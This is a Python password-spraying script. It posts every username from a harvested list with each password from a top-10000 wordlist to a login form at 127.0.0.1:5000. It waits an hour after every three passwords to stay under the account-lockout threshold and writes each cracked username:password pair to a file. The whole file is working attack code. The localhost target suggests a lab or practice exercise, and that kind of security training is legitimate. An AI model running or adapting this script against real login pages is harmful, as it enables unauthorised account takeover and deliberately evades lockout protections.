import requests, time

url = 'http://127.0.0.1:5000/login'

# ---  Open files. If file is read, reset file descriptor location  ---
crackedAccounts = open('cracked_accounts.txt', 'a')
nameList = open('found_usernames.txt', 'r+')
nameListcopy = nameList.readlines()
nameList.seek(0)
passwordList = open('top10000passwords.txt', 'r+')
passwordListCopy = passwordList.readlines()
passwordList.seek(0)

passwordsTried = 0
# ---  For each potential password in the wordlist file, try each username with it once  ---
for line in passwordList:
	if passwordsTried >= 3:
			print("3 passwords tried. Pausing for an hour to avoid account lockouts.")
			time.sleep(3600)
			passwordsTried = 0
			
	password = line.strip('\n')
	print("Current password: " + password)
	usernameIndex = 0

	# For each username try the current password
	for name in nameList:
		name = name.strip('\n')
		payload = {'username': name, 'password': password}
		r = requests.post(url, payload)
		errorLine = r.text.splitlines()[59].lstrip()
		
		# Check HTML response for login alerts. 
		if errorLine.startswith("You have exceeded"):
			print("Lockout detected on password: " + password)
			
		else:
			if not errorLine.startswith("Invalid password"):
				print("Login successful " + name + ":" + password)
				crackedAccounts.writelines(name + ":" + password + '\n')
				del nameListcopy[usernameIndex]
				usernameIndex -= 1
				
		usernameIndex += 1
		
	# ---  Update the username and password lists. ---
	# Remove cracked account usernames
	nameList.seek(0)
	nameList.truncate()
	nameList.writelines(nameListcopy)
	nameList.seek(0)		
	# Remove password from list
	del passwordListCopy[0]
	passwordList.seek(0)
	passwordList.truncate()
	passwordList.writelines(passwordListCopy)
	passwordList.seek(0)
	
	passwordsTried += 1

# ---  Close open files  ---
nameList.close()
crackedAccounts.close()
passwordList.close()
